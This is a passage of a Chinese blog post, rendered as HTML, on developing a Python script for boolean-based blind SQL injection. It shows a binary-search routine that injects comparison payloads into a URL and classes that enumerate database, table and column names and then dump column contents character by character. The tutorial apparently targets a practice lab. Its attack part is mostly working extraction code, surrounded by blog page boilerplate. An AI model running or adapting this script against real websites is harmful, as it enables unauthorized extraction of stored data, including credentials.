class="comment">#代表列表下标的结束值</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = (max + min) // <span class="number">2</span>            <span class="comment">#获取列表下标的中间值</span></span><br><span class="line">        <span class="comment">#定义最终payload格式</span></span><br><span class="line">        final_payload = url + payload + <span class="string">' &gt; &#123;&#125;--+'</span>.format(mid)</span><br><span class="line">        result = self.get_url_request(final_payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> result:</span><br><span class="line">            min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max = mid</span><br><span class="line">        <span class="keyword">if</span> min == max - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">return</span> max</span><br><span class="line">            <span class="keyword">return</span> min+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>猜解数据库库名<code>(class GuessDatabase)</code></strong></p>
+<ul>
+<li><code>get_all_db_Count</code>       实现获取数据库库名数量</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_db_Count</span><span class="params">(self)</span>:</span></span><br><span class="line">        db_count = self.merge_serach.merge_serach(self.url, self.db_count_payload)</span><br><span class="line">        print(<span class="string">'[+] INFO : 当前 mysql 中库的数量为: %d'</span> %(db_count))</span><br><span class="line">        <span class="keyword">return</span> db_count</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_db_Length</code>     实现获取所有库名的长度功能</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_db_Length</span><span class="params">(self, db_count)</span>:</span></span><br><span class="line">        db_length_list = []</span><br><span class="line">    		<span class="comment">#循环获取所有表名的长度</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,db_count):</span><br><span class="line">            db_length = self.merge_serach.merge_serach(self.url, self.db_length_payload.format(i))</span><br><span class="line">            db_length_list.append(db_length)</span><br><span class="line">            <span class="comment"># print("[+] INFO : 库 %d 的长度是: %d" % (i+1, db_length))</span></span><br><span class="line">        <span class="keyword">return</span> db_length_list</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>def get_all_db_Name</code> 实现获取所库名称功能</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_db_Name</span><span class="params">(self, db_count, db_length_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, db_count):</span><br><span class="line">            print(<span class="string">'[+] INFO : 库 %d 的名称为: '</span> %(i+<span class="number">1</span>), end = <span class="string">''</span>)</span><br><span class="line">            db_name = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, db_length_list[i] + <span class="number">1</span>):</span><br><span class="line">                curr_str = chr(self.merge_serach.merge_serach(self.url, self.db_name_payload.format(i, j)))</span><br><span class="line">                db_name += curr_str</span><br><span class="line">                sys.stdout.write(curr_str)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>猜解数据库表名<code>(class GuessTables)</code></strong></p>
+<ul>
+<li><code>get_all_table_Count</code>   实现获取指定库所有表名数量</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_table_Count</span><span class="params">(self)</span>:</span></span><br><span class="line">        tb_count = self.merge_serach.merge_serach(self.url, self.tb_count_payload.format(self.db_name))</span><br><span class="line">        print(<span class="string">'[+] INFO : 当前 %s 库中表的数量为: %d'</span> %(self.db_name, tb_count))</span><br><span class="line">        <span class="keyword">return</span> tb_count</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_table_Length</code>    实现获取指定库所有表名的长度功能</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_table_Length</span><span class="params">(self, tb_count)</span>:</span></span><br><span class="line">        tb_length_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, tb_count):</span><br><span class="line">            tb_length = self.merge_serach.merge_serach(self.url, self.tb_length_payload.format(self.db_name, i))</span><br><span class="line">            tb_length_list.append(tb_length)</span><br><span class="line">        <span class="comment"># print(tb_length_list)</span></span><br><span class="line">        <span class="keyword">return</span> tb_length_list</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_table_Name</code>      实现获取指定库所有表名称功能</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_table_Name</span><span class="params">(self, tb_count, tb_length_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, tb_count):</span><br><span class="line">            print(<span class="string">'[+] INFO : 当前 %s 库中第 %d 个表的名称为:'</span> %(self.db_name, i + <span class="number">1</span>), end = <span class="string">''</span>)</span><br><span class="line">            tb_name = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, tb_length_list[i] + <span class="number">1</span>):</span><br><span class="line">                curr_str = chr(self.merge_serach.merge_serach(self.url, self.tb_name_payload.format(self.db_name, i, j)))</span><br><span class="line">                tb_name += curr_str                </span><br><span class="line">                sys.stdout.write(curr_str)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>猜解数据库字段名<code>(class GuessColumns)</code></strong></p>
+<ul>
+<li><code>get_all_column_Count</code>      实现获取指定表中所有字段数量</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_column_Count</span><span class="params">(self)</span>:</span></span><br><span class="line">        cl_count = self.merge_serach.merge_serach(self.url, self.cl_count_payload.format(self.db_name, self.tb_name))</span><br><span class="line">        print(<span class="string">'[+] INFO : 当前 %s 表中字段的数量为: %d'</span> %(self.tb_name, cl_count))</span><br><span class="line">        <span class="keyword">return</span> cl_count</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_column_Length</code>    实现获取指定表中所有字段长度</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_column_Length</span><span class="params">(self, cl_count)</span>:</span></span><br><span class="line">        cl_length_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, cl_count):</span><br><span class="line">            cl_length = self.merge_serach.merge_serach(self.url, self.cl_length_payload.format(self.db_name, self.tb_name, i))</span><br><span class="line">            cl_length_list.append(cl_length)</span><br><span class="line">        <span class="comment"># print(cl_length_list)</span></span><br><span class="line">        <span class="keyword">return</span> cl_length_list</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_column_Name</code>        实现获取指定表中所有字段名</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_column_Name</span><span class="params">(self, cl_count, cl_length_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, cl_count):</span><br><span class="line">            print(<span class="string">'[+] INFO : 当前 %s 表中第 %d 个字段的名称为:'</span> %(self.db_name, i + <span class="number">1</span>), end = <span class="string">''</span>)</span><br><span class="line">            cl_name = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, cl_length_list[i] + <span class="number">1</span>):</span><br><span class="line">                curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_name_payload.format(self.db_name, self.tb_name, i, j)))</span><br><span class="line">                cl_name += curr_str</span><br><span class="line">                sys.stdout.write(curr_str)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>猜解数据库字段内容<code>(class GuessClContent)</code></strong></p>
+<ul>
+<li><code>get_all_cl_content_Count</code>      实现获取指定字段中所有字段内容的数</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_cl_content_Count</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(self.cl_name_list)):</span><br><span class="line">            cl_content_count = self.merge_serach.merge_serach(self.url, self.cl_content_count_payload.format(self.cl_name_list[i], self.db_tb_name))</span><br><span class="line">        print(<span class="string">'[+] INFO : 当前 %s 字段中内容的数量为: %d'</span> %(self.cl_name, cl_content_count))</span><br><span class="line">        <span class="keyword">return</span> cl_content_count</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_cl_content_Length</code>    实现获取指定字段中所有字段内容的长度</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_cl_content_Length</span><span class="params">(self, cl_content_count)</span>:</span></span><br><span class="line">        all_list = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(self.cl_name_list)):</span><br><span class="line">            cl_content_length_list = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, cl_content_count):</span><br><span class="line">                cl_content_length = self.merge_serach.merge_serach(self.url, self.cl_content_length_payload.format(self.cl_name_list[j], self.db_tb_name, i))</span><br><span class="line">                cl_content_length_list.append(cl_content_length)</span><br><span class="line">            <span class="comment"># print(cl_content_length_list)</span></span><br><span class="line">            all_list.append(cl_content_length_list)</span><br><span class="line">        <span class="comment"># print(all_list)</span></span><br><span class="line">        <span class="comment"># print(self.db_tb</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>get_all_cl_content_details</code>  实现获取指定字段中所有字段内容</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_cl_content_details</span><span class="params">(self, cl_content_count, all_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(all_list)):</span><br><span class="line">            print(<span class="string">'[+] INFO : 字段 %s 的内容为: '</span> % self.cl_name_list[i],end = <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(all_list[i])):</span><br><span class="line">                cl_content_details = <span class="string">""</span></span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>, all_list[i][j] + <span class="number">1</span>):</span><br><span class="line">                    curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_content_details_payload.format(self.cl_name_list[i], self.db_tb_name, j, z)))</span><br><span class="line">                    cl_content_details += curr_str   </span><br><span class="line">                print(<span class="string">' | %s | '</span> %cl_content_details, end = <span class="string">''</span>)</span><br><span class="line">            print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2020/03/07/基于sql布尔盲注的python脚本开发/image-20191226132116635.png" alt="image-20191226132116635"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div id="reward-container">
+  <div>Thank you for your accept. mua！</div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+    
+      
+      
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/reward/wechatpay.png" alt="丨Mr.zhang丨 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+      
+      
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/reward/alipay.png" alt="丨Mr.zhang丨 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>丨Mr.zhang丨</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://Greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发.html" title="基于sql布尔盲注的python脚本开发">https://Greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:16px;">-------------本文结束<i class="fa fa-heart"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全、python/" rel="tag"><i class="fa fa-tag"></i> web安全、python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80Nzk5Ni8yNDQ5Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="丨Mr.zhang丨">
+            
+              <p class="site-author-name" itemprop="name">丨Mr.zhang丨</p>
+              <div class="site-description motion-element" itemprop="description">Love coding,Love life!</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Greetdawn" title="GitHub &rarr; https://github.com/Greetdawn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:953640552@qq.com" title="E-Mail &rarr; mailto:953640552@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/" title="Weibo &rarr; https://weibo.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="tencent://message/?uin=123435796&Site=&menu=yes" title="QQ &rarr; tencent://message/?uin=123435796&Site=&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://youtube.com" title="YouTube &rarr; https://youtube.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-youtube"></i>YouTube</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-book"></i>
+                推荐阅读
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="https://www.t00ls.net/" rel="noopener" target="_blank">土司论坛</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="https://www.freebuf.com/" rel="noopener" target="_blank">Freebuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com" title="https://www.ctfwp.com" rel="noopener" target="_blank">CTF</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://linux.51yip.com/" title="http://linux.51yip.com/" rel="noopener" target="_blank">Linux命令手册</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-python概述"><span class="nav-number">1.</span> <span class="nav-text">4.1 python概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-1-模块详解"><span class="nav-number">1.1.</span> <span class="nav-text">4.1.1 模块详解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-2-面向对象"><span class="nav-number">1.2.</span> <span class="nav-text">4.1.2 面向对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-脚本开发"><span class="nav-number">2.</span> <span class="nav-text">4.2 脚本开发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-1-功能逻辑设计思路"><span class="nav-number">2.1.</span> <span class="nav-text">4.2.1 功能逻辑设计思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-2-编码实现"><span class="nav-number">2.2.</span> <span class="nav-text">4.2.2 编码实现</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" style=" text-align:center;">&copy; 2017 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mr.zhang</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"> 站点字数合计:</i>
+    </span>
+    
+    <span title="站点总字数">13k</span>
+  
+  
+  <span class="post-meta-divider">|</span>
+  <a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">苏ICP备19960824号 </a>
+
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+<div class="run_time" style=" text-align:center;">
+  <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+  <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("08/08/2019 10:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+    setInterval("createtime()",250);
+  </script>
+</div>
+        
+<div class="busuanzi-count" style=" text-align:center;">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+  
+    
+    
+      
+    
+  
+  <script color="255,0,255" opacity="0.7" zindex="-1" count="140" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-nest@1.0.0/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+  
+  <script id="ribbon" size="300" alpha="0.1" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  
+  
+
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2020/03/07/基于sql布尔盲注的python脚本开发.html'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
